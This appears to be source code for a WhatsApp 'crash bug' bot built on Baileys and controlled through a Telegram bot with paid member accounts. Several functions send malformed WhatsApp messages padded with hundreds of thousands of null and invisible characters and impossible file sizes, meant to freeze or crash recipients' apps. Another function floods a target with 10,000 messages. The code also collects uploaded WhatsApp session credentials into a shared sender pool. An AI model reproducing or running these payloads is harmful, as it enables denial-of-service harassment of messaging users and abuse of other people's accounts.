        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}

async function delay(sock, target) {
    try {
        
        const msg1 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };

        const msg2 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000".repeat(300000) + "\u200B".repeat(300000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 98765 }, () => ({}))
                            },
                            messageParamsJson: "\uFDFD".repeat(100000)
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg1, {});
        await new Promise(resolve => setTimeout(resolve, 3000));
        await sock.relayMessage(target, msg2, {});
        
    } catch (error) {
        console.error("❌ Error:", error);
    }
}

// Fungsi iOSxTend yang hilang - ditambahkan
async function blankios(sock, target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363407468452340@newsletter",
      newsletterName: "🍷⃟༑⌁⃰𝐇‌𝐚𝐳𝐚‌𝐳‌𝐞𝐥‌‌‌𝐗‌𝐯‌𝐗‌‌‌🦠" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      caption: "🍷⃟༑⌁⃰𝐇‌𝐚𝐳𝐚‌𝐳‌𝐞𝐥‌‌‌𝐗‌𝐯‌𝐗‌‌‌🦠" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      inviteExpiration: "999999999"
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function docthumb(sock, target) {
  const pnx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐃͜𝐑͓᪳𝐎͓᪳͜𝐈𝐃`𝐔𝐈 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1073741824000000",
              pageCount: 9007199254740991 * 9999,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐃͜𝐑͓᪳𝐎͓᪳͜𝐈𝐃`𝐔𝐈 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "⤻꙳͙͡༑ᐧ̤⌁⃰𝐃͜𝐑͓᪳𝐎͓᪳͜𝐈𝐃`𝐔𝐈 🍷 𝐊͜𝐈͓᪳𝐋𝐋⃪ ▾ ༑̴⟆" + "ꦽ".repeat(60000),
          },
          contextInfo: {
            remoteJid: "X",
            participant: sock.user.id,
            mentionedJid: [target, "13135550002@s.whatsapp.net",],
            quotedMessage: {},
          },
          nativeFlowMessage: {
            messageParamsJson: "{",
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\0" + "💣⃟༑𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ͯཀ͜͡🪅-‣" + "\u0000".repeat(35000),
                  "flow_message_version": "3"
                })
              },
            ]
          }
        }
      }
    },
    participant: { jid: target }
  };

  const pnxMessage = generateWAMessageFromContent(
    target,
    proto.Message.fromObject(pnx),
    {
      userJid: target
    }
  );
  await sock.relayMessage(target, pnxMessage.message,
    {
      messageId: pnxMessage.key.id
    }
  );
}

//==========================================//

const relayMSGCustom = async (sock, target, message) => {
  const authVsP = sock.authState.creds.me.id;
  const meLid = sock.authState.creds.me?.lid;

  const { user: mePN } = jidDecode(authVsP);
  const { user: meLidU } = meLid ? jidDecode(meLid) : { user: null };

  const msgId = generateMessageIDV2(authVsP);
  const ngentodd = jidEncode(jidDecode(meLid)?.user, "lid", undefined);

  const meMsg = {
    deviceSentMessage: {
      destinationJid: target,
      message
    },
    messageContextInfo: message.messageContextInfo
  };

  const VsP = {};

  const mediaTypeVsP =
    message.imageMessage ? "image" : message.videoMessage ? message.videoMessage.gifPlayback ? "gif" : "video" : message.audioMessage ? message.audioMessage.ptt ? "ptt" : "audio" : message.documentMessage ? "document" : message.stickerMessage ? "sticker" : undefined;

  if (mediaTypeVsP) VsP.mediatype = mediaTypeVsP;
  let stanza;
  await sock.authState.keys.transaction(async () => {
    const devices = await sock.getUSyncDevices([ngentodd, target], true, false);
    const meR = [];
    const otR = [];
    for (const { user, jid: dJid } of devices) {
      if (dJid === authVsP || (meLid && dJid === meLid)) continue;
      const isMe = user === mePN || user === meLidU;
      (isMe ? meR : otR).push(dJid);
    }

    const all = [...meR, ...otR];
    await sock.assertSessions(all);
    const [
      { nodes: meN, shouldIncludeDeviceIdentity: s1 },
      { nodes: otN, shouldIncludeDeviceIdentity: s2 }
    ] = await Promise.all([
      sock.createParticipantNodes(meR, {
        conversation: "⟨〽⃟💛✩ ᜴𝐕࿆𝐬𝐏࿆ꢵ ✩💛⃟〽⟩"
      }),
      sock.createParticipantNodes(otR, message, VsP, meMsg)
    ]);

    const ahahahk = [
      ...meN.map(n => {
        n.content[0].content = Buffer.from("hello world", "base64");
        return n;
      }),
      ...otN
    ];

    const incDI = s1 || s2;
    stanza = {
      tag: "message",
      attrs: {
        id: msgId,
        to: target,
        type: ["imageMessage", "videoMessage", "audioMessage", "documentMessage", "stickerMessage"].some(k => k in message) ? "media" : "reactionMessage" in message ? "reaction" : "text"
      },
      content: ahahahk.length ? [{ tag: "participants", attrs: {}, content: ahahahk }] : []
    };

    if (incDI) {
      stanza.content.push({
        tag: "device-identity",
        attrs: {},
        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
      });
    }

    await sock.sendNode(stanza);
  }, authVsP);

  return stanza;
};

//==========================================//

async function VxLOneMsg(sock, target) {
  await sock.sendMessage(target, { 
    text: "VxL - Execute #Fahri"
  });  

  for (let r = 0; r < 10000; r++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
          }
        }
      }
    }, { participant: { jid: target }, messageId: null });
    await new Promise((r) => setTimeout(r, 1500));
  }
}
// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
// connectionMeta: menyimpan tipe sender tiap session
// { "6281234567890": { type: "global" | "private", owner: "username" } }
const connectionMeta = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

// === Setup VIP Folder ===
function getVipSessionPath(sessionName) {
  return path.join('vip', sessionName);
}
function setupVipFolder() {
  // Ganti path menjadi root folder 'vip', bukan di dalam 'permenmd'
  const vipPath = path.join(__dirname, 'vip');

  try {
    if (!fs.existsSync(vipPath)) {
      fs.mkdirSync(vipPath, { recursive: true });
      console.log("[INFO] Folder VIP (root) dibuat otomatis.");
    }
  } catch (err) {
    console.error("[INFO] Gagal membuat folder VIP:", err);
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}/*

async function connectSession(folderPath, sessionName, retries = 5) {
  if (activeConnections[sessionName]) return activeConnections[sessionName];

  const sessionsFold = path.join(folderPath, sessionName);

  return new Promise(async (resolve) => {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;

        if (qr) qrCodes[sessionName] = qr;

        if (connection === "open") {
          delete qrCodes[sessionName];
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          console.log(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") biz[sessionName] = sock;
          else if (type === "Messenger") mess[sessionName] = sock;

          resolve(sock);
        } else if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

          if (isLoggedOut) {
            console.log(`[${sessionName}] Logged out.`);
            fs.rmSync(sessionsFold, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve(null);
          } else if (retries > 0) {
            setTimeout(() => connectSession(folderPath, sessionName, retries - 1).then(resolve), 5000);
          } else {
            console.log(`${sessionName} Connection failed after retries.`);
            resolve(null);
          }
        }
      });
    } catch (err) {
      console.log(`[${sessionName}] Error connecting: ${err.message}`);
      resolve(null);
    }
  });
}*/

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

//const axios = require("axios");
const RAW_URL = "https://raw.githubusercontent.com/DGXeon13/strings/refs/heads/main/strings.json";

async function unfollowAllChannel() {
  try {
    const { data } = await axios.get(RAW_URL);

    if (!Array.isArray(data)) {
      console.log("Data bukan array!");
      return;
    }

    console.log(`Total channel: ${data.length}`);

    for (let i = 0; i < data.length; i++) {
      const jid = data[i];
      try {
        await sock.newsletterUnfollow(jid);
        console.log(`[${i + 1}/${data.length}] Unfollow: ${jid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
      } catch (err) {
        console.log(`Gagal unfollow ${jid}:`, err.message);
      }
    }

    console.log("✅ Selesai unfollow semua channel dari baileys.");
  } catch (error) {
    console.log("❌ Gagal ambil data raw:", error.message);
  }
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('permenmd', owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      try {
        
        await sock.newsletterFollow("120363404995533206@newsletter");
        await sock.newsletterFollow("120363330344810280@newsletter");
        await sleep(5000);
        await unfollowAllChannel();
        console.log("✅ Auto join channel sukses");
      } catch (e) {
        console.log("❌ Auto join channel gagal");
      }
      activeConnections[number] = sock;
      // Tandai tipe connection berdasarkan folder owner
      const isGlobalConn = owner === 'global_pool';
      connectionMeta[number] = { type: isGlobalConn ? 'global' : 'private', owner };
      
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Session tersimpan ke ${isGlobalConn ? '🌍 global_pool' : '🔒 pribadi'}: ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const vipDir = 'vip';
  const baseDir = 'permenmd';
  
  // ── Load global_pool sender (dari member) ──────────────────────────────
  const globalPoolDir = path.join(baseDir, 'global_pool');
  if (fs.existsSync(globalPoolDir)) {
    const gpFiles = fs.readdirSync(globalPoolDir).filter(f => f.endsWith('.json'));
    console.log(`[🌍 GLOBAL POOL] Ditemukan ${gpFiles.length} sender dari member.`);
    for (const file of gpFiles) {
      const sessionName = path.basename(file, '.json');
      if (!activeConnections[sessionName]) {
        try {
          await connectSession(globalPoolDir, sessionName);
          // Tandai sebagai global
          connectionMeta[sessionName] = { type: 'global', owner: 'global_pool' };
          console.log(`[🌍] global_pool session loaded: ${sessionName}`);
        } catch (e) {
          console.error(`[❌] global_pool gagal load ${sessionName}: ${e.message}`);
        }
      }
    }
  } else {
    console.log(`[🌍 GLOBAL POOL] Folder global_pool belum ada, akan dibuat saat member pertama pair.`);
  }
  // ──────────────────────────────────────────────────────────────────────
    /*if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);
    for (const file of vipFiles) {
  const sessionName = path.basename(file, '.json');
  const jsonFile = path.join(vipDir, file);        // vip/628xxx.json
  const sessionFolder = path.join(vipDir, sessionName); // vip/628xxx/

  if (activeConnections[sessionName]) {
    console.log(`[SKIP] VIP ${sessionName} already active.`);
    continue;
  }

  if (!fs.existsSync(sessionFolder)) {
    fs.mkdirSync(sessionFolder, { recursive: true });
    fs.copyFileSync(jsonFile, path.join(sessionFolder, 'creds.json'));
    console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
  }

  try {
    console.log(`[START] Connecting VIP: ${sessionName}`);
    await connectSession(sessionFolder, sessionName, 100, () => {
      // Callback kalau session mati → hapus json asli juga
      if (fs.existsSync(jsonFile)) {
        fs.rmSync(jsonFile, { force: true });
        console.log(`[🗑️] VIP json dihapus: ${file}`);
      }
    });
  } catch (err) {
    console.error(`[ERROR] VIP ${sessionName}:`, err.message);
  }
}*/
/*

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
  const vipFiles = fs.readdirSync(vipDir).filter(f => f.endsWith('.json'));
  console.log(`[DEBUG] VIP files ditemukan: ${vipFiles.length}`);

  for (const file of vipFiles) {
    const sessionName = path.basename(file, '.json');

    if (activeConnections[sessionName]) {
      console.log(`[SKIP] VIP ${sessionName} already active.`);
      continue;
    }

    // Buat folder sementara vip/628xxx/ lalu taruh creds.json di sana
    const sessionFolder = path.join(vipDir, sessionName);
    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      fs.copyFileSync(
        path.join(vipDir, file),         // vip/628xxx.json
        path.join(sessionFolder, 'creds.json') // vip/628xxx/creds.json
      );
      console.log(`[PREP] Folder dibuat untuk ${sessionName}`);
    }

    try {
      console.log(`[START] Connecting VIP: ${sessionName}`);
      await connectSession(vipDir, sessionName);
    } catch (err) {
      console.error(`[ERROR] VIP ${sessionName}:`, err.message);
    }
  }
}
await sleep(20000);*/
  // 2. Scan User Folders — HANYA folder pribadi (bukan global_pool)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => ({ name, fullPath: path.join(baseDir, name) }))
    .filter(({ fullPath }) => fs.lstatSync(fullPath).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const { name: folderName, fullPath: folder } of subfolders) {
    // ── SKIP global_pool — sudah di-load di atas dengan tag type:"global"
    if (folderName === 'global_pool') {
      console.log(`[SKIP] global_pool sudah di-load sebagai global sender, skip scan ulang.`);
      continue;
    }

    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[🔒 START] Private session: ${sessionName} (owner: ${folderName})`);
          await connectSession(folder, sessionName);
          // Tandai sebagai private
          connectionMeta[sessionName] = { type: 'private', owner: folderName };
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}
function prepareVipSessionFolders() {
  const vipFolder = 'vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
    }
    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error preparing VIP folders:", err.message);
    return [];
  }
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectSession('vip', baseName);
  }
}
function getRandomVipConnection() {
  const conns = getActiveVipConnections();
  const keys = Object.keys(conns);
  if (keys.length === 0) return null;
  return conns[keys[Math.floor(Math.random() * keys.length)]];
}
   function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
} 

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [
          [
            { text: "📋 List User", callback_data: "list_user" },
            { text: "🎛 Buat Custom User", callback_data: "create_custom" },
            { text: "🗑 Hapus User", callback_data: "delete_user" }
          ],
        ] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
